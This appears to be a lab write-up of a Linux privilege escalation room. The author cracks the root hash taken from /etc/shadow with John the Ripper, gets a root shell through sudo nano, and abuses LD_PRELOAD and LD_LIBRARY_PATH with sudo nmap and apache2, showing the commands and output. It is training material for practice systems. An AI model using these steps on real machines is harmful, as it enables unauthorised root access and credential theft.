This is a walkthrough with majority of the room guiding, so i will only list down my thought processes and methodologies, as well as anything I do differently

Authenticated with the given credentials via SSH. 
Ran the `id` command to obtain the following output: 
```console
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
user@debian:~$ 
```

checked the /etc/shadow file for the root user's password and cracked it with JtR.
```console
┌──(roshan㉿redhood)-[~/Downloads/THM/linux_PE]
└─$ john root.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)     
1g 0:00:00:00 DONE (2024-01-14 17:42) 1.162g/s 1637p/s 1637c/s 1637C/s cuties..tagged
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
checked the sudo permissions of the user:
```console
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
user@debian:~$ 

```
I used the exploit for `nano` that I found on [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo)
	Was able to get a root shell
```console
  sh-4.1# 
```

From `sudo -l` we can see the environment variables that `sudo` inherits under `env_keep`:
```console
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```
created and compiled a shared object and inserted its path into the `LD_PRELOAD` variable while running service that allows `sudo` permissions, such as `nmap`
```console
user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so nmap
root@debian:/home/user# 
```
performed the following for the apache2 service, since there is not exploit for it on GTFOBins: 
```console
ldd /usr/sbin/apache2
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
```